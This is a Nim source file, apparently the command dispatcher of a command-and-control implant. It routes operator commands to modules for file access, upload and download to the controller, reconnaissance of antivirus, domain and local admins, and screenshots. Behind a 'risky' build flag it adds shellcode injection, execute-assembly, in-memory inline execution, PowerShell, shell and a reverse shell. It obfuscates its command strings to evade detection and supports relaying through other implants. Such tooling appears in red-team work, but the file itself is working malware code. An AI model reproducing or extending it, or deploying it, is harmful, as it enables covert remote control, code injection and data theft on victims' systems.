import strutils
from ../util/crypto import xorStringToByteSeq, xorByteSeqToString
from ../core/webClientListener import Listener
import ../core/relay/[relay_protocol, relay_comm]

# Filesystem operations
include ../modules/filesystem/[cat, cd, cp, ls, mkdir, mv, pwd, rm]

# Network operations
include ../modules/network/[curl, download, upload, wget]

# System information and operations
include ../modules/system/[env, getAv, getDom, getLocalAdm, ps, whoami]

# Execution operations
include ../modules/execution/[run]

# Screenshot operations
include ../modules/screenshot/[screenshot]

# Risky commands (already existing)
when defined risky:
    include ../modules/risky/[executeAssembly, inlineExecute, powershell, shell, shinject, reverseShell]

# Relay commands
include ../modules/relay/[relay, connect]
import ../modules/relay/relay_commands

# Parse user commands for relay implants
proc parseCmdRelay*(ri : RelayImplant, cmd : string, cmdGuid : string, args : seq[string]) : string =
    # Debug logging - show received command
    when defined debug:
        let argsStr = if args.len > 0: " " & args.join(" ") else: ""
        echo "[DEBUG] 🔍 ┌─────────── CMDPARSER RELAY INPUT ───────────┐"
        echo "[DEBUG] 🔍 │ Raw cmd: '" & cmd & "' │"
        echo "[DEBUG] 🔍 │ cmd length: " & $cmd.len & " │"
        echo "[DEBUG] 🔍 │ args: " & $args & " │"
        echo "[DEBUG] 🔍 │ cmdGuid: '" & cmdGuid & "' │"
        echo "[DEBUG] 🔍 │ Full command: '" & cmd & argsStr & "' │"
        echo "[DEBUG] 🔍 │ obf('relay'): '" & obf("relay") & "' │"
        echo "[DEBUG] 🔍 │ cmd == obf('relay'): " & $(cmd == obf("relay")) & " │"
        echo "[DEBUG] 🔍 └─────────────────────────────────────────────┘"

    try:
        # Parse the received command - only commands that don't require Listener object
        if cmd == obf("cat"):
            result = cat(args)
        elif cmd == obf("cd"):
            result = cd(args)
        elif cmd == obf("cp"):
            result = cp(args)
        elif cmd == obf("env"):
            result = env()
        elif cmd == obf("getav"):
            result = getAv()
        elif cmd == obf("getdom"):
            result = getDom()
        elif cmd == obf("getlocaladm"):
            result = getLocalAdm()
        elif cmd == obf("ls"):
            result = ls(args)
        elif cmd == obf("mkdir"):
            result = mkdir(args)
        elif cmd == obf("mv"):
            result = mv(args)
        elif cmd == obf("ps"):
            result = ps()
        elif cmd == obf("pwd"):
            result = pwd()
        elif cmd == obf("rm"):
            result = rm(args)
        elif cmd == obf("run"):
            result = run(args)
        elif cmd == obf("screenshot"):
            result = screenshot(args)
        elif cmd == obf("whoami"):
            result = whoami()
        elif cmd == obf("relay"):
            # Handle relay commands with full command string (same as normal mode)
            let fullCmd = cmd & (if args.len > 0: " " & args.join(" ") else: "")
            when defined debug:
                echo "[DEBUG] 🔧 ┌─────────── CMDPARSER RELAY MATCH ───────────┐"
                echo "[DEBUG] 🔧 │ ✅ RELAY COMMAND MATCHED! │"
                echo "[DEBUG] 🔧 │ fullCmd: '" & fullCmd & "' │"
                echo "[DEBUG] 🔧 └─────────────────────────────────────────────┘"
            result = processRelayCommand(fullCmd)
        else:
            when defined debug:
                echo "[DEBUG] ❌ ┌─────────── CMDPARSER NO MATCH ───────────┐"
                echo "[DEBUG] ❌ │ Command '" & cmd & "' not recognized │"
                echo "[DEBUG] ❌ │ Available commands checked: │"
                echo "[DEBUG] ❌ │ - cat, cd, cp, env, getav, getdom, etc. │"
                echo "[DEBUG] ❌ │ - relay: obf('relay') = '" & obf("relay") & "' │"
                echo "[DEBUG] ❌ │ This will result in 'unknown command' error │"
                echo "[DEBUG] ❌ └─────────────────────────────────────────────┘"
            # Parse risky commands, if enabled (commands that don't need Listener)
            when defined risky:
                if cmd == obf("powershell"):
                    result = powershell(args)
                elif cmd == obf("shell"):
                    result = shell(args)
                else:
                    result = obf("ERROR: Command not supported in relay mode or unknown command.")
            else:
                result = obf("ERROR: Command not supported in relay mode or unknown command.")
    
    # Catch unhandled exceptions during command execution
    except:
        let msg = getCurrentExceptionMsg()
        result = obf("ERROR: An unhandled exception occurred.\nException: ") & msg
    
    # Debug logging - show command result
    when defined debug:
        echo "[DEBUG] Relay command result: " & result

# Parse user commands that do not affect the listener object here
proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]) : string =

    # Debug logging - show received command
    when defined debug:
        let argsStr = if args.len > 0: " " & args.join(" ") else: ""
        echo "[DEBUG] Received command: " & cmd & argsStr

    try:
        # Parse the received command
        # This code isn't too pretty, but using 'case' optimizes away the string obfuscation used here
        if cmd == obf("cat"):
            result = cat(args)
        elif cmd == obf("cd"):
            result = cd(args)
        elif cmd == obf("cp"):
            result = cp(args)
        elif cmd == obf("curl"):
            result = curl(li, args)
        elif cmd == obf("download"):
            # This is the operator console download command process, 
            # In our side, implant must UPLOAD a file to C2 (it will download a file to C2 from operator perspective)
            result = download(li, cmdGuid, args) 
        elif cmd == obf("env"):
            result = env()
        elif cmd == obf("getav"):
            result = getAv()
        elif cmd == obf("getdom"):
            result = getDom()
        elif cmd == obf("getlocaladm"):
            result = getLocalAdm()
        elif cmd == obf("ls"):
            result = ls(args)
        elif cmd == obf("mkdir"):
            result = mkdir(args)
        elif cmd == obf("mv"):
            result = mv(args)
        elif cmd == obf("ps"):
            result = ps()
        elif cmd == obf("pwd"):
            result = pwd()
        elif cmd == obf("rm"):
            result = rm(args)
        elif cmd == obf("run"):
            result = run(args)
        elif cmd == obf("screenshot"):
            result = screenshot(args)
        elif cmd == obf("upload"):
            result = upload(li, cmdGuid, args)
        elif cmd == obf("wget"):
            result = wget(li, args)
        elif cmd == obf("whoami"):
            result = whoami()
        elif cmd == obf("relay"):
            # Handle relay commands with full command string
            let fullCmd = cmd & (if args.len > 0: " " & args.join(" ") else: "")
            result = processRelayCommand(fullCmd)
        else:
            # Parse risky commands, if enabled
            when defined risky:
                if cmd == obf("execute-assembly"):
                    result = executeAssembly(li, args)
                elif cmd == obf("inline-execute"):
                    result = inlineExecute(li, args)
                elif cmd == obf("powershell"):
                    result = powershell(args)
                elif cmd == obf("shell"):
                    result = shell(args)
                elif cmd == obf("shinject"):
                    result = shinject(li, args)
                elif cmd == obf("reverse-shell"):
                    result = reverseShell(args)
                else:
                    result = obf("ERROR: An unknown command was received.")
            else:
                result = obf("ERROR: An unknown command was received.")
    
    # Catch unhandled exceptions during command execution (commonly OS exceptions)
    except:
        let
            msg = getCurrentExceptionMsg()

        result = obf("ERROR: An unhandled exception occurred.\nException: ") & msg
    
    # Debug logging - show command result
    when defined debug:
        echo "[DEBUG] Command result: " & result 